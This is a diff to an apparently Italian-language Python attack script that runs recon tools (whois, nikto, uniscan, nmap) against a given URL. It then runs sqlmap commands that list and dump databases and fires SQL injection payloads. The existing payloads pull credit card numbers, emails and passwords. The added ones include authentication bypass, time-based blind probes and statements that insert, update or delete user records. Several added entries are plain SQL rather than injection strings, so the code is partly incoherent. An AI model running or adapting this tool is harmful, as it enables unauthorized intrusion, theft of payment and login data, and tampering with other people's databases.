@@ -76,7 +76,19 @@ def perform_sql_injection(target_url):
         "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --",
         "' OR 1=1 UNION SELECT email FROM users --",
         "' OR 1=1 UNION SELECT password FROM users --",
-        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --"
+        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --",
+        "SELECT * FROM users WHERE username='admin';",
+        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');",
+        "UPDATE users SET password='newpassword' WHERE username='admin';",
+        "DELETE FROM users WHERE username='olduser';",
+        "SELECT * FROM products WHERE name LIKE '%user_input%';",
+        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;",
+        "SELECT * FROM users WHERE username='user_input' AND password='password_input';",
+        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';",
+        "SELECT * FROM products WHERE name LIKE '%user_input%';",
+        "SELECT * FROM products WHERE name LIKE '%admin%' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1;",
+        "SELECT * FROM products WHERE name LIKE '%user_input%';",
+        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
     ]
 
     for payload in payloads:
@@ -120,7 +132,7 @@ def main():
         "whois": f"whois {link}",
         "nikto": f"nikto -h {link}",
         "uniscan": f"uniscan -u {link} -qd",
-        "nmap": f"nmap {link}",
+               "nmap": f"nmap {link}",
     }
 
     total_tools = len(tools)
@@ -141,7 +153,7 @@ def main():
     # Execute additional SQLMap commands to retrieve database information
     additional_sqlmap_commands = [
         f"sqlmap -u {link_with_https} --dbs",
-        f"sqlmap -u {link_with_https} --tables         -D your_database_name",
+        f"sqlmap -u {link_with_https} --tables -D your_database_name",
         f"sqlmap -u {link_with_https} --columns -D your_database_name -T your_table_name",
         f"sqlmap -u {link_with_https} --dump -D your_database_name -T your_table_name"
     ]
@@ -158,6 +170,9 @@ def main():
         # Calculate and print the progress
         progress = ((i + total_tools) / (total_tools + len(additional_sqlmap_commands))) * 100
         print(f"Progresso: {progress:.2f}%")
+
+    # Perform SQL Injection with additional payloads
+    perform_sql_injection(link_with_https)
 
     print("Analisi completata. I risultati sono stati salvati in:", output_file)
 
